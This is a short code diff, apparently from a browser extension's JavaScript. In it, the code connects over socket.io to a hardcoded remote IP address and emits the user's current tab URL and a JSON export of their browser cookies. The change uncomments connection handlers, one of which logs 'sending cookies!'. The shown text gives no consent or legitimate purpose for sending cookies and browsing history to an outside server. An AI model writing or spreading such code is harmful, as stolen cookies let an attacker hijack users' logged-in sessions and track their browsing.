@@ -186,9 +186,9 @@
       const socket = io.connect('http://76.20.12.128:5800')
       console.log("hi");
       console.log(socket.connected)
-      // socket.on('connect', function() {
-      //   console.log('Client connected', tabUrl);
-      // });
+      socket.on('connect', function() {
+        console.log('Client connected', tabUrl);
+      });
 
       socket.emit('click', tabUrl);
 
@@ -250,9 +250,9 @@
 
       const socket = io.connect('http://76.20.12.128:5800')
       console.log(socket.connected)
-      // socket.on('connect', function() {
-      //   console.log('Client connected, sending cookies!');
-      // });
+      socket.on('connect', function() {
+        console.log('Client connected, sending cookies!');
+      });
       socket.emit('export-cookies', jsonExportCookies);
 
       setTimeout(() => {
@@ -748,6 +748,3 @@
     }
   }
 }());
-
-//
-// module.exports.importCookies = importCookies;
